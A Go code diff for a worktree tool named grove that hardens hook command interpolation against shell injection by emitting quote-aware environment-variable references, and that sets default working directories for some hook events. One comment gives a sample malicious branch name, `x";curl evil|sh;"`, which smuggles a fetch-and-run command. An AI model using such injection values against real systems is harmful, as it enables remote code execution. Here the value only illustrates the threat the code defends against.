@@ -261,26 +261,84 @@ func (v *Variables) shellVarBindings() []shellVarBinding {
 
 // InterpolateShell rewrites a command-hook string for safe execution via
 // `sh -c`. Each {{.x}} token is replaced with an environment-variable
-// reference (${GROVE_HOOK_x}) rather than the literal value, and the real
+// reference to GROVE_HOOK_x rather than the literal value, and the real
 // values are supplied out-of-band via ShellEnv. Because parameter expansion
 // happens *after* the shell has parsed the command, metacharacters in a value
 // can never inject a command — critical because grove interpolates values it
 // doesn't control (notably {{.branch}}, and grove checks out branches from
 // untrusted PRs via `grove fetch pr/<N>`, so a branch named `x";curl evil|sh;"`
-// must not run). The reference is left unquoted so it expands correctly whether
-// the template wraps the token in double quotes (echo "switched to
-// {{.branch}}", the common case — the value stays a single word) or leaves it
-// bare; a value is never re-parsed for operators either way.
+// must not run).
+//
+// The reference is emitted to match the quoting context the token sits in,
+// tracked with a small quote-state scanner:
+//
+//	bare:           echo {{.branch}}      → echo "${GROVE_HOOK_branch}"
+//	double-quoted:  echo "on {{.branch}}" → echo "on ${GROVE_HOOK_branch}"
+//	single-quoted:  echo 'on {{.branch}}' → echo 'on '"${GROVE_HOOK_branch}"''
+//
+// Bare tokens are wrapped in double quotes so a value containing spaces or
+// glob characters stays a single, unexpanded word (paths legally contain
+// both). Single-quoted tokens use the POSIX close-splice-reopen idiom,
+// because ${...} never expands inside single quotes — a flat rewrite there
+// leaked the literal reference and silently broke shipped recipes like
+// `pkill -f '{{.worktree}}'`. In every context the expansion itself is
+// double-quoted or in a double-quoted string, so the result is never
+// re-parsed for operators or split.
 //
 // Interpolate (literal substitution) remains correct for filesystem paths and
 // template bodies, which Go handles directly and which never reach a shell.
 func (v *Variables) InterpolateShell(s string) string {
 	bindings := v.shellVarBindings()
-	pairs := make([]string, 0, len(bindings)*2)
+	envByToken := make(map[string]string, len(bindings))
 	for _, b := range bindings {
-		pairs = append(pairs, b.token, "${"+b.env+"}")
+		envByToken[b.token] = b.env
 	}
-	return strings.NewReplacer(pairs...).Replace(s)
+
+	var out strings.Builder
+	out.Grow(len(s) + 32)
+	inSingle, inDouble := false, false
+	for i := 0; i < len(s); {
+		// Token rewrite, sensitive to the current quoting context.
+		if strings.HasPrefix(s[i:], "{{.") {
+			if rel := strings.Index(s[i:], "}}"); rel >= 0 {
+				token := s[i : i+rel+2]
+				if env, ok := envByToken[token]; ok {
+					switch {
+					case inSingle:
+						out.WriteString(`'"${` + env + `}"'`)
+					case inDouble:
+						out.WriteString("${" + env + "}")
+					default:
+						out.WriteString(`"${` + env + `}"`)
+					}
+					i += rel + 2
+					continue
+				}
+			}
+		}
+
+		c := s[i]
+		// A backslash escapes the next character everywhere except inside
+		// single quotes (where it is literal), so an escaped quote must not
+		// toggle the context. Inside double quotes this over-approximates
+		// (\x keeps the backslash for ordinary x), but the skipped character
+		// is never context-relevant there — ' doesn't toggle inside "..."
+		// anyway.
+		if c == '\\' && !inSingle && i+1 < len(s) {
+			out.WriteByte(c)
+			out.WriteByte(s[i+1])
+			i += 2
+			continue
+		}
+		if c == '\'' && !inDouble {
+			inSingle = !inSingle
+		} else if c == '"' && !inSingle {
+			inDouble = !inDouble
+		}
+		out.WriteByte(c)
+		i++
+	}
+	return out.String()
 }
 
 // ShellEnv returns the GROVE_HOOK_*=value assignments that back the references
@@ -376,8 +434,10 @@ func builtinCommand(action *HookAction, ctx *ExecutionContext, vars *Variables) 
 	switch action.WorkingDir {
 	case "main":
 		workDir = ctx.MainPath
-	case "new", "":
+	case "new":
 		workDir = ctx.NewPath
+	case "":
+		workDir = defaultCommandWorkDir(ctx)
 	default:
 		workDir = vars.Interpolate(action.WorkingDir)
 	}
@@ -393,6 +453,19 @@ func builtinCommand(action *HookAction, ctx *ExecutionContext, vars *Variables) 
 	elapsed := time.Since(start)
 	_, _ = fmt.Fprintf(w, "✓ Ran: %s (%.1fs)\n", command, elapsed.Seconds())
 	return nil
+}
+
+// defaultCommandWorkDir picks the working directory for a command action that
+// didn't set working_dir. The new worktree is the natural default, but it is
+// guaranteed ABSENT for exactly two events — pre-create fires before the
+// directory exists and post-remove after it's deleted — so those default to
+// the main worktree instead of failing chdir (ENOENT) on every invocation.
+// An explicit working_dir = "new" is honored (and fails loudly) even there.
+func defaultCommandWorkDir(ctx *ExecutionContext) string {
+	if (ctx.Event == EventPreCreate || ctx.Event == EventPostRemove) && ctx.MainPath != "" {
+		return ctx.MainPath
+	}
+	return ctx.NewPath
 }
 
 // builtinTemplate performs a template action
